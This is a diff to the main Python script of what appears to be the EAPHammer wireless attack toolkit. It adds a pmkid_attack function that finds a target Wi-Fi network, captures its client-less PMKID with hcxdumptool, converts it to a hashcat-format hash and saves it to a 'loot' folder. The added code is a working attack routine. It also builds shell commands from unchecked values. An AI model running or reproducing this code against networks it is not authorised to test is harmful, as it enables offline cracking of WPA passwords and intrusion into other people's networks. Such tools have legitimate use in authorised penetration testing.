@@ -1,18 +1,23 @@
 #!/usr/bin/env python
 
-import sys
-import os
-import time
-import json
 import argparse
 import core.cli
+import datetime
+import json
+import os
+import signal
+import subprocess
+import sys
+import time
 
+from argparse import ArgumentParser
 from core import cert_manager, conf_manager, utils, responder, services
-from core.servers.redirect_server import RedirectServer
 from core.autocrack import Autocrack
+from core import iw_parse
 from core.hostapd import HostapdEaphammer
 from core.hostapd_config import HostapdConfig
-from argparse import ArgumentParser
+from core.servers.redirect_server import RedirectServer
+from datetime import datetime
 from settings import settings, __version__
 
 
@@ -325,6 +330,117 @@ def reap_creds():
         # cleanly allow network manager to regain control of interface
         interface.nm_on()
 
+def pmkid_attack():
+
+    bssid = options['bssid']
+    channel = options['channel']
+    essid = options['essid']
+    interface = core.interface.Interface(options['interface'])
+    hcxpcaptool = settings.dict['paths']['hcxtools']['hcxpcaptool']['bin']
+    hcxdumptool = settings.dict['paths']['hcxdumptool']['bin']
+    hcxpcaptool_ofile = settings.dict['paths']['hcxtools']['hcxpcaptool']['ofile']
+    hcxdumptool_ofile = settings.dict['paths']['hcxdumptool']['ofile']
+    hcxdumptool_filter = settings.dict['paths']['hcxdumptool']['filter']
+    loot_dir = settings.dict['paths']['directories']['loot']
+
+    interface.down()
+    interface.nm_off()
+    interface.mode_managed()
+    interface.up()
+
+    print '[*] Scanning for nearby access points...'
+    networks = iw_parse.iw_parse.get_interfaces(interface=str(interface))
+    print '[*] Complete!'
+    time.sleep(.5)
+
+    interface.down()
+    interface.mode_monitor()
+    interface.up()
+
+    if bssid is not None:
+
+        if channel is None:
+            print '[*] No channel specified... finding appropriate channel...'
+            channel = iw_parse.helper_functions.find_channel_from_bssid(bssid, networks)
+            if channel is None:
+                print '[!] Target network not found... aborting...'
+                sys.exit()
+            print '[*] Channel %d selected...' % channel
+            print '[*] Complete!'
+        
+        essid = iw_parse.helper_functions.find_essid_from_bssid(bssid, networks)
+        if essid is None:
+            print '[!] Target network is hidden...'
+            essid = ''
+    
+    elif essid is not None:
+
+        print '[*] No bssid or channel specified...'
+        print '[*] ... searching for AP that has ESSID %s...' % essid
+        bssid = iw_parse.helper_functions.find_bssid_from_essid(essid, networks)
+        if bssid is None:
+            print '[!] Target network not found... aborting...'
+            sys.exit()
+        print '[*] BSSID %s selected...' % bssid
+        channel = iw_parse.helper_functions.find_channel_from_bssid(bssid, networks)
+        if channel is None:
+            print '[!] Target network not found... aborting...'
+            sys.exit()
+        print '[*] Channel %d selected...' % channel
+        print '[*] Complete!'
+    
+    else:
+        raise Exception('BSSID or ESSID must be specified')
+
+    print '[*] Creating filter file for target...'
+    with open(hcxdumptool_filter, 'w') as fd:
+        fd.write('%s' % bssid.replace(':', ''))
+    print '[*] Complete!'
+
+    print '[*] Running hcxdumptool...'
+    p = subprocess.Popen('%s -i %s -c %d -o %s --filtermode=2 --filterlist=%s --enable_status=3' % (hcxdumptool, interface, channel, hcxdumptool_ofile, hcxdumptool_filter), shell=True, stdout=subprocess.PIPE, preexec_fn=os.setsid)
+    while True:
+        line = p.stdout.readline()
+        print line,
+        if 'FOUND PMKID CLIENT-LESS]' in line:
+            break
+    os.killpg(os.getpgid(p.pid), signal.SIGTERM)
+    print '[*] Complete!'
+
+    print '[*] Extracting hash from pcap file using hcxpcaptool...'
+    os.system('%s -z %s %s' % (hcxpcaptool, hcxpcaptool_ofile, hcxdumptool_ofile))
+    with open(hcxpcaptool_ofile) as fd:
+        hash_str = fd.read()
+        print '\thashcat format:', hash_str
+    print '[*] Complete!'
+
+    save_file = os.path.join(loot_dir, '-'.join([
+            essid,
+            bssid,
+            datetime.strftime(datetime.now(), '%Y-%m-%d-%H-%M-%S'),
+            'PMKID.txt',
+    ]))
+    
+    print '[*] Saving hash to %s' % save_file
+    with open(save_file, 'w') as fd:
+        fd.write(hash_str)
+    print '[*] Complete!'
+
+    print '[*] Removing temporary files...'
+    try:
+        os.remove(hcxpcaptool_ofile)
+    except OSError as e:
+        print "Error: %s - %s" % (e.filename, e.strerror)
+    try:
+        os.remove(hcxdumptool_filter)
+    except OSError as e:
+        print "Error: %s - %s" % (e.filename, e.strerror)
+    try:
+        os.remove(hcxdumptool_ofile)
+    except OSError as e:
+        print "Error: %s - %s" % (e.filename, e.strerror)
+    print '[*] Complete!'
+
 def save_config_only():
 
     hostapd_conf = HostapdConfig(settings, options)
@@ -368,6 +484,8 @@ if __name__ == '__main__':
         captive_portal()
     elif options['hostile_portal']:
         hostile_portal()
+    elif options['pmkid']:
+        pmkid_attack()
     else:
         reap_creds()
 
